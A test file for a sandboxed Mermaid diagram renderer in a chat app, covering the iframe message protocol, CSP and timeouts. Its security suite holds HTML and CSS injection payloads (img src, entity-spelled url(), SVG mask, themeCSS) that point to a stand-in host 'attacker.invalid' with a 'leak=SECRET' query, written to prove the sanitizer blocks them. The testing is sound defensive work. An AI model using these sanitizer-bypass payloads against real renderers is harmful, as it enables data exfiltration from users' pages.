import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, test } from "bun:test";
import { setupDom } from "@agenteschat/ui/testing/dom";

setupDom();

import { readFileSync } from "node:fs";
import { join } from "node:path";
import { cleanup, render } from "@testing-library/react";
import { MermaidDiagram, setMermaidRenderer } from "@/components/artifacts/Mermaid";
import { createI18n } from "@/i18n";
import { Markdown } from "@/lib/markdown";
import {
  drawWithMermaid,
  type MermaidFrame,
  mermaidDrawable,
  mermaidFrameDocument,
  setMermaidFrame,
  svgDrawing,
} from "@/lib/mermaid";
import { settle } from "./render";

const fence = (source: string) => `\`\`\`mermaid\n${source}\n\`\`\``;
const FLOW = "flowchart LR\n  A[Pedido] --> B[Deploy]";
const SVG = '<svg xmlns="http://www.w3.org/2000/svg" width="100%" viewBox="0 0 200 80"><title>Fluxo</title></svg>';
const tick = () => new Promise<void>((resolve) => setTimeout(resolve, 0));

type Request = { id: string; source: string; dark: boolean };
/** A stand-in for the frame mermaid draws in: what the page posted to it, its load, whether it was thrown away. */
type FakeFrame = { win: Window; posted: Request[]; load: () => void; removed: boolean };
/** The frames the page made, oldest first. */
const frames: FakeFrame[] = [];
function fakeFrame(): MermaidFrame {
  const posted: Request[] = [];
  let load = () => {};
  const loaded = new Promise<void>((resolve) => {
    load = resolve;
  });
  const made: FakeFrame = {
    win: { postMessage: (m: Request) => posted.push(m) } as unknown as Window,
    posted,
    load,
    removed: false,
  };
  frames.push(made);
  return {
    window: () => (made.removed ? null : made.win),
    loaded,
    remove: () => {
      made.removed = true;
    },
  };
}
/** A message to the page, as posted by `from`: the frame's window, or any other. */
const post = (from: unknown, data: unknown) =>
  window.dispatchEvent(new MessageEvent("message", { source: from as MessageEventSource, data }));
/** The page's frame, loaded and ready, the way mermaid-frame.js says it is. */
async function readyFrame(index = 0) {
  const made = frames[index] as FakeFrame;
  made.load();
  await tick();
  post(made.win, { ready: true });
  await tick();
  return made;
}

beforeAll(() => createI18n("pt-BR"));
afterAll(() => {
  setMermaidFrame(null);
  setMermaidRenderer(null);
});
beforeEach(() => {
  frames.length = 0;
  setMermaidFrame(fakeFrame);
  // The real renderer, with nothing drawn yet.
  setMermaidRenderer(null);
});
afterEach(() => cleanup());

describe("the frame mermaid draws in", () => {
  test("a drawing is sent once the frame has loaded and said it's ready, and comes back as its SVG", async () => {
    const drawing = drawWithMermaid("d1", FLOW, true);
    const made = frames[0] as FakeFrame;
    made.load();
    await tick();
    expect(made.posted).toEqual([]);
    post(made.win, { ready: true });
    await tick();
    expect(made.posted).toEqual([{ id: "d1", source: FLOW, dark: true }]);
    post(made.win, { id: "d1", svg: SVG });
    expect(await drawing).toBe(SVG);
  });

  test("one mermaid can't draw fails with mermaid's error, and the frame is kept for the next", async () => {
    const drawing = drawWithMermaid("bad", "sequenceDiagram\n  Ana-->>", false);
    const made = await readyFrame();
    post(made.win, { id: "bad", error: "Error: Parse error on line 2" });
    await expect(drawing).rejects.toThrow("Parse error on line 2");
    const next = drawWithMermaid("good", FLOW, false);
    await tick();
    expect(frames).toHaveLength(1);
    expect(made.posted.at(-1)).toEqual({ id: "good", source: FLOW, dark: false });
    post(made.win, { id: "good", svg: SVG });
    expect(await next).toBe(SVG);
  });

  test("only the frame's own window is heard, and only in the protocol's shape", async () => {
    // Another frame on the page, like an agent's HTML page.
    const other = { postMessage() {} };
    const drawing = drawWithMermaid("d2", FLOW, false);
    const made = frames[0] as FakeFrame;
    post(other, { ready: true });
    made.load();
    await tick();
    expect(made.posted).toEqual([]);
    post(made.win, { ready: true });
    await tick();
    expect(made.posted).toHaveLength(1);
    const fake = '<svg xmlns="http://www.w3.org/2000/svg"><text>fake</text></svg>';
    for (const [from, data] of [
      [other, { id: "d2", svg: fake }],
      [window, { id: "d2", svg: fake }],
      [null, { id: "d2", svg: fake }],
      [made.win, { id: "d2", svg: 1 }],
      [made.win, { id: 2, svg: fake }],
      [made.win, { id: "d3", svg: fake }],
      [made.win, [{ id: "d2", svg: fake }]],
      [made.win, fake],
      [made.win, null],
    ])
      post(from, data);
    post(made.win, { id: "d2", svg: SVG });
    expect(await drawing).toBe(SVG);
  });

  test("a message from another frame while the frame is still being made is dropped, not an error", async () => {
    // Until the outer frame has parsed the inner one, reading the inner one's window throws (Chromium).
    const proto = HTMLIFrameElement.prototype;
    const own = Object.getOwnPropertyDescriptor(proto, "contentWindow");
    const blocked = new Proxy(
      {},
      {
        get() {
          throw new DOMException(
            'Blocked a frame with origin "null" from accessing a cross-origin frame.',
            "SecurityError",
          );
        },
      },
    );
    Object.defineProperty(proto, "contentWindow", { configurable: true, get: () => blocked });
    const errors: unknown[] = [];
    const report = (event: ErrorEvent) => errors.push(event.error);
    window.addEventListener("error", report);
    try {
      // The real frame (happy-dom runs none of its scripts).
      setMermaidFrame(null);
      const drawing = drawWithMermaid("early", FLOW, false, 30);
      post({ postMessage() {} }, { ready: true });
      await expect(drawing).rejects.toThrow("didn't finish");
      expect(errors).toEqual([]);
    } finally {
      window.removeEventListener("error", report);
      if (own) Object.defineProperty(proto, "contentWindow", own);
      setMermaidFrame(fakeFrame);
    }
  });

  test("a frame that doesn't answer in time is thrown away, and the next drawing gets a fresh one", async () => {
    const stuck = drawWithMermaid("stuck", FLOW, false, 30);
    const first = await readyFrame();
    await expect(stuck).rejects.toThrow("didn't finish");
    expect(first.removed).toBe(true);
    const next = drawWithMermaid("next", FLOW, false, 1000);
    expect(frames).toHaveLength(2);
    const second = await readyFrame(1);
    expect(second.posted).toEqual([{ id: "next", source: FLOW, dark: false }]);
    // The block that timed out may try again: it goes to the fresh frame too.
    const again = drawWithMermaid("stuck-again", FLOW, false, 1000);
    await tick();
    post(second.win, { id: "next", svg: SVG });
    post(second.win, { id: "stuck-again", svg: SVG });
    expect([await next, await again]).toEqual([SVG, SVG]);
  });

  test("the time allowed counts from the frame's load, however slow mermaid's bundle is to arrive", async () => {
    const drawing = drawWithMermaid("slow", FLOW, false, 30);
    await new Promise((resolve) => setTimeout(resolve, 90));
    const made = await readyFrame();
    expect(made.removed).toBe(false);
    post(made.win, { id: "slow", svg: SVG });
    expect(await drawing).toBe(SVG);
  });

  test("a fence on the page is drawn in the frame; a page without one makes no frame", async () => {
    render(<Markdown source={"# Notas\n\n```ts\nconst a = 1;\n```"} />);
    await settle();
    expect(frames).toEqual([]);
    const el = render(<Markdown source={fence(FLOW)} />).container;
    await settle();
    const made = await readyFrame();
    const [asked] = made.posted;
    expect(asked).toEqual({ id: expect.any(String), source: FLOW, dark: false });
    post(made.win, { id: asked?.id, svg: SVG });
    await settle();
    expect(el.querySelector(".code-card__preview img")?.getAttribute("alt")).toBe("Fluxo");
  });

  test("a diagram longer than mermaid draws stays code, in Drive too, and never reaches the frame", async () => {
    const long = `flowchart LR\n  A[${"x".repeat(50_000)}] --> B`;
    const el = render(<MermaidDiagram source={long} label="Diagrama: Fluxo" />).container;
    await settle();
    expect(el.querySelector(".artifact-diagram--failed code")?.textContent).toBe(long);
    expect(frames).toEqual([]);
  });

  test("both frames are sandboxed with scripts only, and load nothing but mermaid's bundle and mermaid-frame.js", () => {
    const scripts = [
      "https://agentes.example/assets/mermaid.min-a1.js",
      "https://agentes.example/assets/mermaid-frame-b2.js",
    ];
    const csp = `default-src 'none'; script-src ${scripts.join(" ")}; style-src 'unsafe-inline'; img-src data:`;
    const parse = (html: string) => new DOMParser().parseFromString(html, "text/html");
    const policy = (doc: Document) =>
      doc.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute("content");
    const outer = parse(mermaidFrameDocument(scripts));
    expect(policy(outer)).toBe(csp);
    expect(outer.querySelectorAll("script")).toHaveLength(0);
    const inner = outer.querySelector("iframe");
    expect(inner?.getAttribute("sandbox")).toBe("allow-scripts");
    const drawing = parse(inner?.getAttribute("srcdoc") ?? "");
    expect(policy(drawing)).toBe(csp);
    expect(Array.from(drawing.querySelectorAll("script"), (s) => s.getAttribute("src"))).toEqual(scripts);
  });
});

/*
 * mermaid-frame.js with the real mermaid 11.17.2, drawing in this test's page instead of the frame. Nothing reaches
 * the network here: every place where markup turns into a load is recorded instead (`new Image().src`, URL and style
 * attributes, HTML handed to the parser, <style> text, style properties), and the outside host is reserved (.invalid).
 */

const HOST = "attacker.invalid";
const LEAK = `https://${HOST}/p.png?leak=SECRET`;
/** What the page was asked to load from the outside host: the requests a browser would have made. */
const requested: string[] = [];
const note = (where: string, value: unknown) => {
  if (String(value).includes(HOST)) requested.push(`${where}: ${value}`);
};

/** `new Image()` the way mermaid's image nodes use it. */
class RecordingImage {
  naturalWidth = 10;
  naturalHeight = 10;
  #src = "";
  get src() {
    return this.#src;
  }
  set src(value: string) {
    note("new Image().src", value);
    this.#src = value;
  }
  decode() {
    return Promise.resolve();
  }
}

/** The real mermaid, loaded once the DOM is attached: its sanitizer takes the window it finds when it loads. */
let mermaid: typeof import("mermaid")["default"];
const restore: (() => void)[] = [];
function patch(target: object, key: string, descriptor: PropertyDescriptor) {
  const before = Object.getOwnPropertyDescriptor(target, key);
  Object.defineProperty(target, key, { configurable: true, enumerable: before?.enumerable, ...descriptor });
  restore.push(() => (before ? Object.defineProperty(target, key, before) : Reflect.deleteProperty(target, key)));
}

/** mermaid-frame.js run here: what it answered, and a way to post to it as `from` (by default, the page it answers). */
function frameScript() {
  const answers: unknown[] = [];
  const page = { postMessage: (message: unknown) => answers.push(message) };
  let listener = async (_event: { source: unknown; data: unknown }) => {};
  const code = readFileSync(join(import.meta.dir, "../src/lib/mermaid-frame.js"), "utf8");
  // Its globals in the frame: the window above the outer frame is the page, and mermaid's bundle defines `mermaid`.
  new Function("parent", "addEventListener", "mermaid", code)(
    { parent: page },
    (_type: string, added: typeof listener) => {
      listener = added;
    },
    mermaid,
  );
  const ask = async (data: unknown, from: unknown = page) => {
    const before = answers.length;
    await listener({ source: from, data });
    return answers.length > before ? answers.at(-1) : undefined;
  };
  return { answers, ask };
}

/**
 * Label HTML that mermaid puts in the document, spelled the ways a tag check misses. Its sanitizer, as
 * mermaid-frame.js sets it, drops what would load.
 */
const LABEL_HTML: [string, string][] = [
  [
    "a sequence message with math, the first attribute with no value",
    `sequenceDiagram\n  A->>B: $$x$$ <img alt src=${LEAK}>`,
  ],
  ["a sequence message with math, slashes between attributes", `sequenceDiagram\n  A->>B: $$x$$ <img/alt/src=${LEAK}>`],
  ["a sequence message with math, an attribute named =x", `sequenceDiagram\n  A->>B: $$x$$ <img =x src=${LEAK}>`],
  ["a sequence note with math", `sequenceDiagram\n  participant A\n  Note over A: $$x$$ <img alt src=${LEAK}>`],
  ["a participant's alias with math", `sequenceDiagram\n  participant A as $$x$$ <img alt src=${LEAK}>\n  A->>A: oi`],
  ["a class label with math", `classDiagram\n  class A["$$x$$ <img alt src=${LEAK}>"]`],
  [
    "a class label's style attribute, url( spelled with an entity",
    `classDiagram\n  class A["$$x$$ <b alt style=background-image:ur#108;(${LEAK})>b</b>;"]`,
  ],
  [
    "an inline SVG's mask in a class label",
    `classDiagram\n  class A["$$x$$ <svg><rect x mask=ur#108;(${LEAK}#m) /></svg>"]`,
  ],
  ["an architecture service's text", `architecture-beta\n  service s1 "<img alt src=${LEAK}>"[S1]`],
  ["an architecture service's text, a backslash after <", `architecture-beta\n  service s1 "<\\img src=${LEAK}>"[S1]`],
];
/** A diagram's own settings that would reach the document's CSS. */
const SETTINGS = [
  `%%{init: {"themeCSS": ".node rect { mask-image: url(${LEAK}) }"}}%%\nflowchart LR\n  A --> B`,
  `%%{initialize: {"fontFamily": "x; mask-image: url(${LEAK})"}}%%\nflowchart LR\n  A --> B`,
  `---\nconfig:\n  themeCSS: ".node rect { mask-image: url(${LEAK}) }"\n---\nflowchart LR\n  A --> B`,
  `---\n"\\x63onfig": {fontFamily: "x; mask-image: url(${LEAK})"}\n---\nflowchart LR\n  A --> B`,
];

/** Mermaid with its own sanitizer settings instead of mermaid-frame.js's; what it leaves in <body> is then removed. */
async function drawRaw(id: string, source: string) {
  const before = new Set(document.body.children);
  mermaid.initialize({
    startOnLoad: false,
    htmlLabels: false,
    flowchart: { htmlLabels: false },
    suppressErrorRendering: true,
  });
  await mermaid.mermaidAPI.render(id, source).catch(() => {});
  // It draws a participant's label without waiting for it.
  await settle();
  for (const el of Array.from(document.body.children)) if (!before.has(el)) el.remove();
}

describe("inside the frame, mermaid-frame.js", () => {
  beforeAll(async () => {
    mermaid = (await import("mermaid")).default;
    // What a browser has and happy-dom lacks, so mermaid takes the paths it takes there: MathML (without it each
    // `$$…$$` becomes the text "MathML is unsupported") and text with a box (without one every label fails its
    // measuring). Blank text has none, as in Chromium.
    patch(window, "MathMLElement", { value: class {}, writable: true });
    patch(SVGGraphicsElement.prototype, "getBBox", {
      value(this: SVGGraphicsElement) {
        const text = this.textContent?.trim() ?? "";
        return new DOMRect(0, 0, text.length * 8, text ? 16 : 0);
      },
    });
    const inPage = (node: Node) => node.ownerDocument === document;
    const loads = (name: string) =>
      /^(?:src|srcset|href|background|poster|data|style)$/i.test(name.replace(/^.*:/, ""));
    patch(globalThis, "Image", { value: RecordingImage, writable: true });
    const { setAttribute, setAttributeNS, insertAdjacentHTML } = Element.prototype;
    patch(Element.prototype, "setAttribute", {
      value(this: Element, name: string, value: string) {
        if (inPage(this) && loads(name)) note(`<${this.localName} ${name}>`, value);
        setAttribute.call(this, name, value);
      },
    });
    patch(Element.prototype, "setAttributeNS", {
      value(this: Element, ns: string | null, name: string, value: string) {
        if (inPage(this) && loads(name)) note(`<${this.localName} ${name}>`, value);
        setAttributeNS.call(this, ns, name, value);
      },
    });
    patch(Element.prototype, "insertAdjacentHTML", {
      value(this: Element, where: InsertPosition, html: string) {
        if (inPage(this)) note(`<${this.localName}> HTML`, html);
        insertAdjacentHTML.call(this, where, html);
      },
    });
    for (const proto of [Node.prototype, Element.prototype, HTMLElement.prototype, SVGElement.prototype])
      for (const key of ["innerHTML", "outerHTML", "textContent"]) {
        const own = Object.getOwnPropertyDescriptor(proto, key);
        if (!own?.set) continue;
        patch(proto, key, {
          get: own.get,
          set(this: Node, value: string) {
            if (inPage(this) && (key !== "textContent" || this.nodeName === "STYLE"))
              note(`<${this.nodeName.toLowerCase()}> ${key === "textContent" ? "text" : "HTML"}`, value);
            own.set?.call(this, value);
          },
        });
      }
    const { setProperty } = CSSStyleDeclaration.prototype;
    patch(CSSStyleDeclaration.prototype, "setProperty", {
      value(this: CSSStyleDeclaration, name: string, value: string, priority?: string) {
        note(`style ${name}`, value);
        setProperty.call(this, name, value, priority);
      },
    });
  });
  afterAll(() => {
    for (const undo of restore.reverse()) undo();
  });
  beforeEach(() => {
    requested.length = 0;
  });

  test("it answers the page that made it and no one else, each drawing as its SVG or mermaid's error", async () => {
    const frame = frameScript();
    expect(frame.answers).toEqual([{ ready: true }]);
    expect(await frame.ask({ id: "a", source: FLOW, dark: false }, { postMessage() {} })).toBeUndefined();
    for (const data of [{ id: 1, source: FLOW }, { id: "a", source: 1 }, FLOW, null])
      expect(await frame.ask(data)).toBeUndefined();
    const drawn = (await frame.ask({ id: "a", source: FLOW, dark: false })) as { id: string; svg: string };
    expect(drawn.id).toBe("a");
    expect(svgDrawing(drawn.svg).width).toBeGreaterThan(0);
    expect(await frame.ask({ id: "b", source: "sequenceDiagram\n  Ana-->>", dark: true })).toEqual({
      id: "b",
      error: expect.stringContaining("Parse error"),
    });
  });

  let labels = 0;
  test.each(LABEL_HTML)("%s: its HTML goes into the document without anything that loads", async (_, source) => {
    const frame = frameScript();
    // Under happy-dom an architecture diagram fails at its layout (no canvas), after its services are drawn. What a
    // participant's label puts in the document after the drawing is done counts too.
    await frame.ask({ id: "label", source, dark: false });
    await settle();
    expect(requested).toEqual([]);
    // With mermaid's own sanitizer settings the document asks for the URL: this label's HTML does reach it.
    await drawRaw(`raw-${++labels}`, source);
    expect(requested).not.toEqual([]);
  });

  test("a diagram's own settings that would reach CSS are dropped", async () => {
    const frame = frameScript();
    for (const source of SETTINGS) expect(await frame.ask({ id: "s", source, dark: false })).toHaveProperty("svg");
    expect(requested).toEqual([]);
  });

  test("what its settings let through, an image node, a classDef's url() and an actor's icon, is the frame's CSP to stop", async () => {
    const frame = frameScript();
    await frame.ask({ id: "image", source: `flowchart TD\n  A@{ img: "${LEAK}" }`, dark: false });
    expect(requested).toContain(`new Image().src: ${LEAK}`);
    requested.length = 0;
    const classUrl = `stateDiagram-v2\n  [*] --> s1\n  classDef c fill:url(${LEAK})\n  class s1 c`;
    await frame.ask({ id: "css", source: classUrl, dark: false });
    expect(requested.some((r) => r.startsWith("<style> HTML") && r.includes(LEAK))).toBe(true);
    requested.length = 0;
    const icon = `sequenceDiagram\n  participant A\n  properties A: {"icon": "${LEAK}"}`;
    await frame.ask({ id: "icon", source: icon, dark: false });
    expect(requested).toContain(`<image href>: ${LEAK}`);
  });

  test("a drawing that fails takes everything mermaid left in its body with it", async () => {
    const frame = frameScript();
    // A blank line in a label has no box to measure: mermaid stops with its measuring <svg> still in <body>.
    const failed = await frame.ask({ id: "blank", source: "sequenceDiagram\n  A->>B: a<br> <br>b", dark: false });
    expect(failed).toEqual({ id: "blank", error: expect.stringContaining("not in render tree") });
    expect(document.body.children).toHaveLength(0);
  });

  test("front matter goes to mermaid when mermaid reads it, and stays code when mermaid would refuse it", async () => {
    const flow = "flowchart LR\n  A --> B";
    const cases: [string, boolean][] = [
      [`---\ntitle: Fluxo\n---\n${flow}`, true],
      [`  ---\n  title: Fluxo\n  ---\n${flow}`, true],
      [`--- \r\ntitle: Fluxo\r\n---\t\r\n${flow}`, true],
      [`---\ntitle: Fluxo\n${flow}`, false],
      [`---\ntitle: Fluxo\n  ---\n${flow}`, false],
      [`---\n---\n${flow}`, false],
      [`---\n${flow}\n---`, false],
    ];
    for (const [source, reads] of cases) {
      expect(mermaidDrawable(source)).toBe(reads);
      expect(Boolean(await mermaid.parse(source, { suppressErrors: true }))).toBe(reads);
    }
  });

  test("runs of whitespace as long as the page sends are drawn in a moment; longer ones stay code", async () => {
    // Safari and Firefox draw on the page's thread, and these took them seconds: mermaid's own regexes backtrack over
    // long runs of whitespace (front matter that never closes, blank lines, a label of spaces).
    for (const source of [
      `---${"\n".repeat(39_960)}x`,
      `---${"\n".repeat(49_990)}`,
      `flowchart LR\n${"\n".repeat(40_000)}  A --> B`,
      `flowchart LR\n  A[a${" ".repeat(40_000)}b] --> B`,
    ])
      expect(mermaidDrawable(source)).toBe(false);
    const fill = (unit: string) => unit.repeat(Math.floor(47_000 / unit.length));
    const blankLines = fill(`${"\n".repeat(1000)}A --> B`);
    const frame = frameScript();
    for (const source of [
      `flowchart LR${blankLines}`,
      `flowchart LR\n${fill(`  A[a${" ".repeat(1000)}b] --> B\n`)}`,
      `---${"\n".repeat(1000)}title: Fluxo\n---\nflowchart LR${blankLines}`,
    ]) {
      expect(mermaidDrawable(source)).toBe(true);
      const start = performance.now();
      expect(await frame.ask({ id: "long", source, dark: false })).toHaveProperty("svg");
      expect(performance.now() - start).toBeLessThan(1000);
    }
  });

  test("a gantt is drawn 720px wide, which a card fits, not as wide as the frame", async () => {
    const frame = frameScript();
    const gantt = "gantt\n  dateFormat YYYY-MM-DD\n  section Entrega\n  Build :a1, 2024-01-01, 3d";
    const drawn = (await frame.ask({ id: "g", source: gantt, dark: false })) as { svg: string };
    expect(svgDrawing(drawn.svg).width).toBe(720);
  });
});
